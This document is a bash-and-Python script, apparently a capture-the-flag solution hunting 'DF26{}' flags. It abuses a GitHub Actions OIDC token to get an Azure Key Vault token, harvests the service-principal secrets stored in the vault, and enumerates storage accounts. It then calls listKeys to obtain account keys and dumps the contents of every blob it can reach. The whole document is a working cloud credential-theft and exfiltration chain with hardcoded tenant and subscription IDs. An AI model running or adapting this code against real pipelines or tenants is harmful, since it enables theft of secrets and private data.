#!/usr/bin/env bash
set -u
: "${AZURE_CLIENT_ID:=72ff278a-9e71-43ec-bac4-2ca303f8e462}"
: "${AZURE_TENANT_ID:=3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
VT=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d client_id="${AZURE_CLIENT_ID}" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
export VT
python3 - <<'PY'
import os,json,urllib.request,urllib.parse,re,hmac,hashlib,base64,datetime
VT=os.environ["VT"]; TID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"; XV="2021-08-06"; SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
def req(u,t,method="GET",data=None):
    try:return urllib.request.urlopen(urllib.request.Request(u,headers={"Authorization":"Bearer "+t},method=method,data=data),timeout=25).read().decode()
    except Exception as e:
        try:return "ERR:"+e.read().decode()[:150]
        except:return "ERR:"+str(e)
def tok(c,x,sc):
    d=urllib.parse.urlencode({"client_id":c,"client_secret":x,"grant_type":"client_credentials","scope":sc}).encode()
    try:return json.load(urllib.request.urlopen(f"https://login.microsoftonline.com/{TID}/oauth2/v2.0/token",d,timeout=20)).get("access_token")
    except:return None
def hit(tag,s):
    for m in set(re.findall(r'DF26\{[^}]*\}',s)):print("  !!!FLAG",tag,":"," ".join(m))
def sk(acct,key,path,params):
    date=datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
    ch=f"x-ms-date:{date}\nx-ms-version:{XV}\n"; cr=f"/{acct}{path}"
    for k in sorted(params):cr+=f"\n{k}:{params[k]}"
    sts="\n".join(["GET","","","","","","","","","","",""])+"\n"+ch+cr
    sig=base64.b64encode(hmac.new(base64.b64decode(key),sts.encode(),hashlib.sha256).digest()).decode()
    url=f"https://{acct}.blob.core.windows.net{path}"+("?"+urllib.parse.urlencode(params) if params else "")
    r=urllib.request.Request(url,headers={"Authorization":f"SharedKey {acct}:{sig}","x-ms-date":date,"x-ms-version":XV})
    try:return urllib.request.urlopen(r,timeout=25).read().decode('utf-8','replace')
    except Exception as e:
        try:return "ERR:"+e.read().decode()[:150]
        except:return "ERR:"+str(e)
PV="https://kv-tbl-prod-x3euoz.vault.azure.net"
sps=[]
for s in json.loads(req(PV+"/secrets?api-version=7.4",VT))["value"]:
    try:
        j=json.loads(json.loads(req(s["id"]+"?api-version=7.4",VT))["value"]);sps.append((s["id"].rsplit("/",1)[-1],j["appId"],j["clientSecret"]))
    except:pass
ids={}
for name,cid,sec in sps:
    at=tok(cid,sec,"https://management.azure.com/.default")
    if not at:continue
    r=req(f"https://management.azure.com/subscriptions/{SUB}/resources?api-version=2021-04-01",at)
    try:
        for x in json.loads(r).get("value",[]):
            if x.get("type")=="Microsoft.Storage/storageAccounts":ids[x["name"]]=x["id"]
    except:pass
    if ids:break
print("storage ids:",list(ids))
for name,cid,sec in sps:
    at=tok(cid,sec,"https://management.azure.com/.default")
    if not at:continue
    for acct,rid in ids.items():
        lk=req(f"https://management.azure.com{rid}/listKeys?api-version=2023-01-01",at,method="POST",data=b"")
        if '"keys"' in lk:
            key=json.loads(lk)["keys"][0]["value"];print(f"[{name}] KEY {acct} OK")
            for c in re.findall(r'<Name>([^<]+)</Name>',sk(acct,key,"/",{"comp":"list"})):
                for blob in re.findall(r'<Name>([^<]+)</Name>',sk(acct,key,f"/{c}",{"restype":"container","comp":"list"})):
                    data=sk(acct,key,f"/{c}/{urllib.parse.quote(blob)}",{})
                    hit(f"{acct}/{c}/{blob}",data);print(f"   {acct}/{c}/{blob} ({len(data)}b):",data[:300].replace(chr(10)," "))
        elif "ERR" not in lk[:4]:
            pass
print("== done ==")
PY
